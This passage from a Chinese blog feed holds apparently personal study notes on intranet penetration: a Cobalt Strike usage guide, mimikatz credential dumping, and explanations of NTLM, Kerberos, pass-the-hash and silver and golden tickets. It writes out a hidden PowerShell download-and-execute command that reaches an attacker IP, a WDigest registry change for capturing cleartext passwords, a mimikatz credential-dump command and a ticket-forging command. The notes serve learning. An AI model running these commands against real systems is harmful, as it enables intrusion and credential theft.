<p>上线马依旧看这篇文章：<br><a href="https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/">https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</a></p>
</blockquote>
<h4 id="上线成功"><a href="#上线成功" class="headerlink" title="上线成功"></a>上线成功</h4><p><img src="http://static.zybuluo.com/1kbfree/c6y62wuj455i5orto3o40tpv/image_1e03kt9fo8j519dmi0o1dv6gom2n.png" alt="image_1e03kt9fo8j519dmi0o1dv6gom2n.png-31.7kB"></p>
<p>然后使用<code>mimikatz</code>跑一下密码</p>
<p><img src="http://static.zybuluo.com/1kbfree/m8th70gfaxqxkdzf220g05ob/image_1e03l8306hsi1s6u13c2170v1v5d34.png" alt="image_1e03l8306hsi1s6u13c2170v1v5d34.png-141.4kB"></p>
<p>直接就把域管账号密码跑下来了~</p>
<p>致此先这里完结一段落，后续学历了<strong>痕迹清理</strong>、<strong>隐藏攻击手段</strong>等技术后再续文缘。</p>
<p>祝我在内网之旅中开心成长~</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透重头戏之Cobaltstrike用法</title>
    <url>/2020/01/30/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%87%8D%E5%A4%B4%E6%88%8F%E4%B9%8BCobaltstrike%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>将Cobaltstrike称为，<code>Cs</code></p>
</blockquote>
<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">│  agscript 拓展应用的脚本</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  c2lint  检查profile的错误异常</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  cobaltstrike</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  cobaltstrike.jar 客户端程序</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  icon.jpg</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  license.pdf</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  readme.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  releasenotes.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  teamserver  服务端程序</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  update</span></pre></td></tr><tr><td class="code"><pre><span class="line">│  update.jar</span></pre></td></tr><tr><td class="code"><pre><span class="line">│</span></pre></td></tr><tr><td class="code"><pre><span class="line">└─third-party 第三方工具</span></pre></td></tr><tr><td class="code"><pre><span class="line">        README.vncdll.txt</span></pre></td></tr><tr><td class="code"><pre><span class="line">        vncdll.x64.dll</span></pre></td></tr><tr><td class="code"><pre><span class="line">        vncdll.x86.dll</span></pre></td></tr></table></figure>

<h2 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h2><p><code>Cs</code>分为<strong>客户端</strong>和<strong>服务端</strong></p>
<p>服务端<code>(teamserver)</code>开放<code>Cs</code>服务给客户端<code>(cobaltstrike.exe)</code>连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">赋予执行权限：</span></pre></td></tr><tr><td class="code"><pre><span class="line">chmod 777 teamserver</span></pre></td></tr><tr><td class="code"><pre><span class="line">然后在服务端执行</span></pre></td></tr><tr><td class="code"><pre><span class="line">.&#x2F;teamserver IP 密码</span></pre></td></tr></table></figure>

<p>然后<code>host</code>填上面的<code>IP</code>密码也是填一样的。</p>
<p><img src="http://static.zybuluo.com/1kbfree/2s63jmpiehak2iqwycdcfky0/image_1duof1rbk1nts1t1h1lo87oc1mih9.png" alt="image_1duof1rbk1nts1t1h1lo87oc1mih9.png-17.4kB"></p>
<h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New Connection  新的链接</span></pre></td></tr><tr><td class="code"><pre><span class="line">Preferences 偏好设置</span></pre></td></tr><tr><td class="code"><pre><span class="line">Visualization  窗口视图模式</span></pre></td></tr><tr><td class="code"><pre><span class="line">VPN interfaces  VPN接入</span></pre></td></tr><tr><td class="code"><pre><span class="line">Listeners  监听器</span></pre></td></tr><tr><td class="code"><pre><span class="line">Sript Manager  脚本管理</span></pre></td></tr><tr><td class="code"><pre><span class="line">Close 退出</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">View：</span></pre></td></tr><tr><td class="code"><pre><span class="line">Applications 用于显示 System Profiler 获取的目标浏览器，操作系统，flash版本</span></pre></td></tr><tr><td class="code"><pre><span class="line">Credentials 显示所有已经获取的用户主机hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">Downloads 显示下载的文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">Event log 事件日志 记录团队  目标上线等记录</span></pre></td></tr><tr><td class="code"><pre><span class="line">Keystrokes 目标键盘记录</span></pre></td></tr><tr><td class="code"><pre><span class="line">Proxy Pivots 代理信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">Screenshots 屏幕截图</span></pre></td></tr><tr><td class="code"><pre><span class="line">Script Console 加载自定义脚本</span></pre></td></tr><tr><td class="code"><pre><span class="line">Targets 显示所有主机</span></pre></td></tr><tr><td class="code"><pre><span class="line">Web log web服务日志</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Attack：</span></pre></td></tr><tr><td class="code"><pre><span class="line">Packages</span></pre></td></tr><tr><td class="code"><pre><span class="line">HTML Application 生成hta文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">MS Office Macro  宏office文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">Payload Generator  生成各种语言版本的payload</span></pre></td></tr><tr><td class="code"><pre><span class="line">USB&#x2F;CD AutoPlay 利用自动播放运行的被控端文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">Windows Dropper 捆绑器可将任意正常的文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">Windows Executable payload生成可执行文件 (一般使用这个)</span></pre></td></tr><tr><td class="code"><pre><span class="line">Windows Executable (S)  把包含payload,Stageless生成可执行文件(包含多数功能)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Web Drive-by：</span></pre></td></tr><tr><td class="code"><pre><span class="line">Manage  开启的所有web服务</span></pre></td></tr><tr><td class="code"><pre><span class="line">Clone Site 克隆网站 </span></pre></td></tr><tr><td class="code"><pre><span class="line">Host File 提供Web以供下载某文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">Scripted Web Delivery  为payload提供web服务以便于下载和执行</span></pre></td></tr><tr><td class="code"><pre><span class="line">Signed Applet Attack  启动一个Web服务以提供自签名Java Applet的运行环境</span></pre></td></tr><tr><td class="code"><pre><span class="line">Smart Applet Attack  自动检测Java版本并l利用已知的exploits绕过security</span></pre></td></tr><tr><td class="code"><pre><span class="line">System Profiler 获取系统，Flash，浏览器版本等</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">Reporting：</span></pre></td></tr><tr><td class="code"><pre><span class="line">Activity report  活动报告</span></pre></td></tr><tr><td class="code"><pre><span class="line">Hosts report  主机报告</span></pre></td></tr><tr><td class="code"><pre><span class="line">Indicators of Compromise 威胁报告</span></pre></td></tr><tr><td class="code"><pre><span class="line">Sessions report  会话报告</span></pre></td></tr><tr><td class="code"><pre><span class="line">Social engineering report  社会工程学报告</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">右键功能：</span></pre></td></tr><tr><td class="code"><pre><span class="line">Interact 打开beacon</span></pre></td></tr><tr><td class="code"><pre><span class="line">Access </span></pre></td></tr><tr><td class="code"><pre><span class="line">	dump hashes 获取hash</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Elevate  提权</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Golden Ticket 生成黄金票据注入当前会话</span></pre></td></tr><tr><td class="code"><pre><span class="line">	MAke token  凭证转换</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Run Mimikatz 运行 Mimikatz </span></pre></td></tr><tr><td class="code"><pre><span class="line">	Spawn As 用其他用户生成Cobalt Strike侦听器</span></pre></td></tr><tr><td class="code"><pre><span class="line">Explore</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Browser Pivot 劫持目标浏览器进程</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Desktop(VNC)  桌面交互</span></pre></td></tr><tr><td class="code"><pre><span class="line">	File Browser  文件浏览器</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Net View 命令Net View</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Port scan 端口扫描</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Process list 进程列表</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Screenshot 截图</span></pre></td></tr><tr><td class="code"><pre><span class="line">Pivoting</span></pre></td></tr><tr><td class="code"><pre><span class="line">	SOCKS Server 代理服务</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Listener  反向端口转发</span></pre></td></tr><tr><td class="code"><pre><span class="line">	Deploy VPN 部署VPN</span></pre></td></tr><tr><td class="code"><pre><span class="line">Spawn  新的通讯模式并生成会话</span></pre></td></tr><tr><td class="code"><pre><span class="line">Session 会话管理，删除，心跳时间，退出，备注</span></pre></td></tr></table></figure>



<h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><h3 id="使用命令行上线（反弹shell）"><a href="#使用命令行上线（反弹shell）" class="headerlink" title="使用命令行上线（反弹shell）"></a>使用命令行上线（反弹<code>shell</code>）</h3><p><img src="http://static.zybuluo.com/1kbfree/fksqczkkt24aragim8dw6on6/image_1dusr4i6vtm31mcln5i1f2n5qgm.png" alt="image_1dusr4i6vtm31mcln5i1f2n5qgm.png-34.9kB"></p>
<p>点开后界面如下，然后一些监听操作都是界面化的不需要自己去构造命令如何执行。</p>
<p><img src="http://static.zybuluo.com/1kbfree/n16nyxdcsu1qzsvf4xhz58yg/image_1dusrf4tc1aq81cj51eni1trt1vsh9.png" alt="image_1dusrf4tc1aq81cj51eni1trt1vsh9.png-23.9kB"></p>
<p>图里的<code>Listener</code>里的是监听端口和监听<code>IP</code>，然后会生成一个<code>powershell</code>代码，命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;47.xxx.xxx.xxx:80&#x2F;a&#39;))&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">这个称为上线一句话</span></pre></td></tr></table></figure>

<p>其实就是把监听的命令写在了<code>http://47.xxx.xxx.xxx/a</code>里，然后用<code>powershell</code>远程执行。</p>
<p>然后比如我们拿下了<code>webshell</code>或者可以执行系统命令，就可以直接甩<code>Cs</code>生成的命令，然后执行成功为下图</p>
<p><img src="http://static.zybuluo.com/1kbfree/kk8afqw8zanmbfi84f1ifbss/image_1dusrv3p81kab1r02t6ub2i15r2m.png" alt="image_1dusrv3p81kab1r02t6ub2i15r2m.png-98.2kB"></p>
<blockquote>
<p>如果目标系统执行不了<code>powershell</code>可以使用其他的，<code>Cs</code>自带有四个</p>
</blockquote>
<p><img src="http://static.zybuluo.com/1kbfree/rt0edb54refwsshknvqv6ciz/image_1duss1c5lm51ml4aa711ev1kcq13.png" alt="image_1duss1c5lm51ml4aa711ev1kcq13.png-20.3kB"></p>
<h3 id="文件浏览"><a href="#文件浏览" class="headerlink" title="文件浏览"></a>文件浏览</h3><p><img src="http://static.zybuluo.com/1kbfree/6jdhrv4hyoppfwzbrx6xhddq/image_1dvo9shpg1m6488k1qhq1k3iguq19.png" alt="image_1dvo9shpg1m6488k1qhq1k3iguq19.png-67.7kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/4dqj9mzbdzkfy8xt8ykdc5in/image_1dvo9sqaehflbe91dcs10e1gvr1m.png" alt="image_1dvo9sqaehflbe91dcs10e1gvr1m.png-107.3kB"></p>
<h3 id="取密码"><a href="#取密码" class="headerlink" title="取密码"></a>取密码</h3><blockquote>
<p>有很多系统不能直接取明文密码，可以修改注册表选项<br><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code><br>然后重启就行了（可以修改后，等目标机器重启然后直接读明文密码）</p>
</blockquote>
<h4 id="内存密码"><a href="#内存密码" class="headerlink" title="内存密码"></a>内存密码</h4><p>直接跑<code>mimikatz</code>取内存密码</p>
<p><img src="http://static.zybuluo.com/1kbfree/e6kzfvih1qztqdfwjzifbx82/image_1dvo9ult415fp19pp1o1d5e5tii23.png" alt="image_1dvo9ult415fp19pp1o1d5e5tii23.png-22.4kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/c5lysnfgc5461ayfwue97645/image_1dvpdunuogd01t1s1ci2bfr15749.png" alt="image_1dvpdunuogd01t1s1ci2bfr15749.png-48.3kB"></p>
<h4 id="注册表密码"><a href="#注册表密码" class="headerlink" title="注册表密码"></a>注册表密码</h4><p><code>dumphash</code>取内存密码</p>
<p><img src="http://static.zybuluo.com/1kbfree/who9omiotu87nb434ljjorqu/image_1dvoa09r61tn3t8012fb1qso1sa02g.png" alt="image_1dvoa09r61tn3t8012fb1qso1sa02g.png-22.3kB"></p>
<p><img src="http://static.zybuluo.com/1kbfree/ceqwt7xbtxy91jopiqrmhjzt/image_1dvpdv6joftfm321lt01hbu12rmm.png" alt="image_1dvpdv6joftfm321lt01hbu12rmm.png-21.8kB"></p>
<h3 id="代理进内网"><a href="#代理进内网" class="headerlink" title="代理进内网"></a>代理进内网</h3><blockquote>
<p>为什么要使用代理？</p>
<ol>
<li>如内网用很多功能用图形化展示比较方便，如<code>mysql</code>等，那么我们可以在目标内网开通一个渠道，供我们去连接然后可以去使用图形化工具</li>
</ol>
</blockquote>
<p>目标内网<code>192.168.31.140</code>，我的服务端<code>192.168.31.138</code>，假设不在同一个内网，我服务端是<code>VPS</code>，目标<code>IP</code>是内网，那么我可以通过<code>Cs</code>在服务端开一个端口代理，这个代理是走目标内网流量的，所以我代理服务端端口就等于我用目标内网的流量。</p>
<p><img src="http://static.zybuluo.com/1kbfree/k02ri1uj6i0i2zhtxaj0mjjc/image_1dvr3i44p1sco1hdl1ula1bet1bip9.png" alt="image_1dvr3i44p1sco1hdl1ula1bet1bip9.png-19.3kB"></p>
<p>然后我们可以点击<code>View -&gt; Proxy Pivots</code>来看代理记录</p>
<p><img src="http://static.zybuluo.com/1kbfree/sdp69il2idxxbztfo02htkov/image_1dvr3qes312r6knjf641io92o316.png" alt="image_1dvr3qes312r6knjf641io92o316.png-76.4kB"></p>
<p>然后代理服务端的<code>IP</code>的<code>55423</code>端口</p>
<p><img src="http://static.zybuluo.com/1kbfree/crprpdh4ylnxjwniwf5wt8ft/image_1dvr43q9eslohnfkudn9nqo1j.png" alt="image_1dvr43q9eslohnfkudn9nqo1j.png-66.7kB"></p>
<h3 id="扩展插件"><a href="#扩展插件" class="headerlink" title="扩展插件"></a>扩展插件</h3><blockquote>
<p>这里使用<code>k8</code>哥哥开发的内网渗透扫描器<code>Ladon</code><br>项目地址：<br><a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
</blockquote>
<p>下载之后，点击<code>Cobalt Strike -&gt; Script Manager</code></p>
<p><img src="http://static.zybuluo.com/1kbfree/kq90l07tvo3jrbzk29mm1rx7/image_1dvr6pn2jviro3b1klsldsu622g.png" alt="image_1dvr6pn2jviro3b1klsldsu622g.png-27.7kB"></p>
<p>然后把<code>Ladon</code>的<code>Ladon.cna</code>导入进去，如图</p>
<p><img src="http://static.zybuluo.com/1kbfree/26levrgir6t5apc2558fqm1q/111.png" alt="111.png-63.2kB"></p>
<p>直接在命令行输入<code>Ladon help</code>可以看帮助</p>
<p><img src="http://static.zybuluo.com/1kbfree/1hf0c4imxjdi63fk0c63jojs/1111.png" alt="1111.png-137.1kB"></p>
<p>用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ladon 192.168.11.0&#x2F;24 OnlinePC # IP存活扫描 </span></pre></td></tr><tr><td class="code"><pre><span class="line">Ladon 192.168.11.0&#x2F;24 PortScan # 端口扫描 </span></pre></td></tr><tr><td class="code"><pre><span class="line">Ladon 192.168.11.0&#x2F;24 webScan  # web扫描 </span></pre></td></tr><tr><td class="code"><pre><span class="line">Ladon 192.168.11.0&#x2F;24 MS17010  # 17010扫描s</span></pre></td></tr></table></figure>

<h3 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h3><p>还未学到此知识点，等学到了更新</p>
]]></content>
      <categories>
        <category>兴趣爱好</category>
        <category>好文</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Window认证认证介绍</title>
    <url>/2020/01/27/Window%E8%AE%A4%E8%AF%81%E8%AE%A4%E8%AF%81%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<blockquote>
<p>在了解内网渗透前，是很有必要去学习这些的。</p>
</blockquote>
<h3 id="Window密码存储地址"><a href="#Window密码存储地址" class="headerlink" title="Window密码存储地址"></a>Window密码存储地址</h3><p><img src="http://static.zybuluo.com/1kbfree/f1ygs3wnu6j1pyigdh36uukl/image_1dvghvc8e14em19r11o1q1ab51qs39.png" alt="image_1dvghvc8e14em19r11o1q1ab51qs39.png-29.7kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\system32\config\sam</span></pre></td></tr></table></figure>

<h3 id="Window密码存储过程"><a href="#Window密码存储过程" class="headerlink" title="Window密码存储过程"></a>Window密码存储过程</h3><ul>
<li>用户输入密码</li>
<li>程序将密码进行<code>NTLM</code>算法加密为<code>HASH</code>值存储在<code>SAM</code>文件，并保存在本地<code>SAM</code>数据库</li>
</ul>
<p>可以看看<code>NTLM HASH</code>值是怎么样的</p>
<p><img src="http://static.zybuluo.com/1kbfree/faewul12q0qbwdmce6n1fbu7/1.png" alt="1.png-23.9kB"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fuck NTLM加密后 8592e1331718673b0ee32df3c0153456</span></pre></td></tr></table></figure>

<p><code>NTLM HASH</code>的前者是<code>LM HASH</code>，简单来说就是<code>LM</code>算法比<code>NTLM</code>算法垃圾，然后被淘汰，所以比较新的操作系统的密码不容易被读取出来，而<code>03</code>、<code>xp</code>系统就是使用<code>LM HASH</code>所以我们可以直接内网渗透的时候读取到原文密码而不用去跑<code>HASH</code>。</p>
<h3 id="Window登录过程"><a href="#Window登录过程" class="headerlink" title="Window登录过程"></a>Window登录过程</h3><p>当我们登录<code>window</code>系统的时候，系统会读取<code>SAM</code>文件中的密码与我们输入的密码进行验证，如果正确则成功登录。在<code>SAM</code>文件中，我们的密码是<code>NTLM HASH</code>加密的，这样子在一定的情况下保障了密码的安全。</p>
<p>更详细的就是</p>
<p>用户开机输入密码 -&gt; 系统会调用<code>winlogon.exe</code>接受用户输入的密码 -&gt; 在<code>lsass.exe</code>进程将明文密码转换成<code>NTLM HASH</code>然后读取<code>SAM</code>数据库与用户名，如果正确将<code>User SID</code>和<code>Group SID</code>传到<code>winlogon.exe</code>准备登录，如果失败则提示密码错误</p>
<blockquote>
<p><code>LSASS</code>用于本地安全和登录策略</p>
</blockquote>
<h3 id="Window网络认证"><a href="#Window网络认证" class="headerlink" title="Window网络认证"></a>Window网络认证</h3><blockquote>
<p>工作组概念（需要了解）：</p>
</blockquote>
<blockquote>
<p>工作组(Work Group)是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱(恐怕网络邻居也会显示“下一页”吧)。为了解决这一问题，Windows 9x/NT/2000 才引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p>
</blockquote>
<p>假设<code>A</code>主机与<code>B</code>主机同在一个工作组，<code>A</code>想登录<code>B</code>，那么<code>A</code>需要知道<code>B</code>的账号密码，且<code>B</code>需要开启<code>SMB</code>服务（<code>PORT:445</code>）。</p>
<blockquote>
<p><code>SMB</code>服务主要用于文件共享</p>
</blockquote>
<h3 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h3><blockquote>
<p>早期<code>SMB</code>协议在网络上是明文传输的，后来出现了<code>LM</code>验证机制，但是他很简单所以可以被破解为明文，所以又推出了<code>NTLM</code></p>
</blockquote>
<p><code>NTLM</code>是一种网络认证协议，它基于<code>挑战（Chalenge）</code>和<code>响应（Response）</code>机制的协议，只支持<code>Window</code>系统</p>
<h4 id="挑战（Chalenge）和响应（Response）"><a href="#挑战（Chalenge）和响应（Response）" class="headerlink" title="挑战（Chalenge）和响应（Response）"></a><code>挑战（Chalenge）</code>和<code>响应（Response）</code></h4><p><code>NTLM</code>认证分三步：协商、质询、验证</p>
<p><strong>协商</strong>：用于确认双方协议版本（用于兼容各版本）<br><strong>质询</strong>：客户端向服务端发送用户信息请求，服务端接受请求生成一个<code>16</code>位随机数(<code>Challenge</code>)，使用用户名对应的<code>NTLM HASH</code>加密<code>Challenge</code>然后生成为<code>Challenge1</code>，然后发送给客户端，客户端接收到<code>Challenge</code>后将要登录的账户对应的<code>NTLM HASH</code>加密<code>Challenge</code>生成<code>Respone</code>并发送给服务端，服务端接受到客户端的<code>Respone</code>后，对比<code>Challenge</code>和<code>Challenge</code>是否相同，如果相同就认证成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Challen1 &#x3D; NTLM HASH(Challenge) &#x3D; Net NTLM Hash</span></pre></td></tr></table></figure>

<p><strong>验证</strong>：质询完成后验证结果</p>
<h3 id="NTLM-v2协议"><a href="#NTLM-v2协议" class="headerlink" title="NTLM v2协议"></a>NTLM v2协议</h3><p><code>NTLM v1</code>生成的随机数是8位、<code>NTLM v2</code>的有<code>16</code>位。</p>
<p><code>v1</code>的加密算法是<code>DES</code>、<code>v2</code>的算法是<code>HMAC-MD5</code></p>
<h3 id="Pass-The-Hash（哈希传递）"><a href="#Pass-The-Hash（哈希传递）" class="headerlink" title="Pass The Hash（哈希传递）"></a>Pass The Hash（哈希传递）</h3><p>在内网横向渗透中，攻击人员经常会抓取管理员的密码和<code>NTLM HASH</code>来进行横向渗透</p>
<p>哈希传递指不需要账户明文密码的情况下完成认证，使攻击人员在渗透中获取不到明文也可以进行登录。</p>
<h4 id="哈希传递的要求"><a href="#哈希传递的要求" class="headerlink" title="哈希传递的要求"></a>哈希传递的要求</h4><p>1、需要能访问目标服务器<br>2、需要传递被认证的用户名<br>3、需要传递被认证用户的<code>NTLM HASH</code></p>
<blockquote>
<p>相当于<code>web</code>端的<code>xss</code>获取到的<code>cookie</code>，而不需要账户密码进行认证。</p>
</blockquote>
<h4 id="哈希传递原理"><a href="#哈希传递原理" class="headerlink" title="哈希传递原理"></a>哈希传递原理</h4><p>将用户名对应的<code>NTLM HASH</code>加密服务器给出的<code>Chanllenge</code>，生成一个<code>Response</code>给服务器来完成认证。</p>
<h3 id="Kerberos域认证"><a href="#Kerberos域认证" class="headerlink" title="Kerberos域认证"></a>Kerberos域认证</h3><h4 id="活动目录（Active-Directory）概念"><a href="#活动目录（Active-Directory）概念" class="headerlink" title="活动目录（Active Directory）概念"></a>活动目录（Active Directory）概念</h4><p><code>Active Directory</code>存储了有关<strong>网络对象</strong>的信息，让管理员和用户可以查找和使用执行信息</p>
<p><strong>网络对象</strong>：存储用户、用户组、计算机、域、组织单位以及安全策略…</p>
<blockquote>
<p>在一个机器上装上活动目录后，这个机器就是一个域控服务器</p>
</blockquote>
<h4 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h4><p>和<code>NTLM</code>一样都是认证协议，当他比<code>NTLM</code>安全</p>
<p><code>Kerberos</code>的设计目标是通过密钥系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， <code>Kerberos</code> 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥）执行认证服务的。</p>
<p>简要大概地说一下<code>Kerberos</code>是如何工作的：</p>
<ol>
<li>假设你要在一台电脑上访问另一个服务器（你可以发送<code>telnet</code>或类似的登录请求）。你知道服务器要接受你的请求必须要有一张<code>Kerberos</code>的“入场券”。</li>
<li>要得到这张入场券，你首先要向验证服务器（<code>AS</code>）请求验证。<strong>验证服务器会创建基于你的密码（从你的用户名而来）的一个“会话密钥”（就是一个加密密钥），并产生一个代表请求的服务的随机值。</strong>这个会话密钥就是“允许入场的入场券”。</li>
<li>然后，你把这张允许入场的入场券发到授权服务器（<code>TGS</code>）。<code>TGS</code>物理上可以和验证服务器是同一个服务器，只不过它现在执行的是另一个服务。<code>TGS</code>返回一张可以发送给请求服务的服务器的票据。</li>
<li>服务器或者拒绝这张票据，或者接受这张票据并执行服务。</li>
<li>因为你从<code>TGS</code>收到的这张票据是打上时间戳的，所以它允许你在某个特定时期内（一般是八小时）不用再验证就可以使用同一张票来发出附加的请求。使这张票拥有一个有限的有效期使其以后不太可能被其他人使用。</li>
</ol>
<p>或者如下的理解：</p>
<ol>
<li>客户机将明文密码、时间戳（使用<code>krbtgt</code>密码<code>hash</code>作为密钥）进行<code>NTLM</code>哈希加密,发送给<code>kdc</code>（域控），<code>kdc</code>对用户进行检测，成功之后创建<code>TGT(Ticket-Granting Ticket)</code></li>
<li>将<code>TGT</code>进行加密签名返回给客户机器，只有域用户<code>krbtgt</code>才能读取<code>kerberos</code>中<code>TGT</code>数据</li>
<li>然后客户机将<code>TGT</code>发送给域控制器<code>KDC</code>请求<code>TGS</code>（票证授权服务）票证，并且对<code>TGT</code>进行检测</li>
<li>检测成功之后，将目标服务账户的<code>NTLM</code>以及<code>TGT</code>进行加密，将加密后的结果返回给客户机。</li>
</ol>
<h3 id="白银票据-Silver-Tickets"><a href="#白银票据-Silver-Tickets" class="headerlink" title="白银票据(Silver Tickets)"></a>白银票据(Silver Tickets)</h3><blockquote>
<p>特点：<br>不需要与<code>KDC</code>交互<br>需要目标服务器的<code>NTLM HASH</code>（有目标服务器的权限，但是不知道明文密码，就可以用<code>NTLM HASH</code>跳过服务器认证完成认证）</p>
</blockquote>
<blockquote>
<p><code>Server Session Key</code>在未发送<code>Ticket</code>之前，服务器是不知道<code>Server Session Key</code>是什么的。 所以，一切凭据都来源于<code>Server Hash</code></p>
</blockquote>
<h4 id="伪造白银票据"><a href="#伪造白银票据" class="headerlink" title="伪造白银票据"></a>伪造白银票据</h4><p>这里使用的是<code>mimikatz.exe</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::list #列出票据</span></pre></td></tr><tr><td class="code"><pre><span class="line">kerberos::purge #清除票据</span></pre></td></tr></table></figure>

<h5 id="导出Server-Hash"><a href="#导出Server-Hash" class="headerlink" title="导出Server Hash"></a>导出Server Hash</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; pj.txt</span></pre></td></tr></table></figure>

<h5 id="伪造票据"><a href="#伪造票据" class="headerlink" title="伪造票据"></a>伪造票据</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span></pre></td></tr></table></figure>

<h4 id="白银票据防御"><a href="#白银票据防御" class="headerlink" title="白银票据防御"></a>白银票据防御</h4><ul>
<li>保证服务器<code>HASH</code>不被获取</li>
<li>开启<code>PAC</code>（特权属性证书保护，规定服务器必须将票据发送给<code>kerberos</code>服务并验证票据是否有效）<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">开启方法：</span></pre></td></tr><tr><td class="code"><pre><span class="line">将注册表中HKEY_LOCAL_MACHINE\SYSTEM \ CurrentControlSet\Control\Lsa\Kerberos\Parameters的ValidateKdcPacSignature设置为1</span></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><blockquote>
<p>特点：</p>
<ol>
<li>需要与<code>DC</code>通信</li>
<li>需要<code>krbtgt</code>用户的<code>HASH</code></li>
</ol>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">krbtgt HASH &#x3D; KDC HASH</span></pre></td></tr></table></figure>
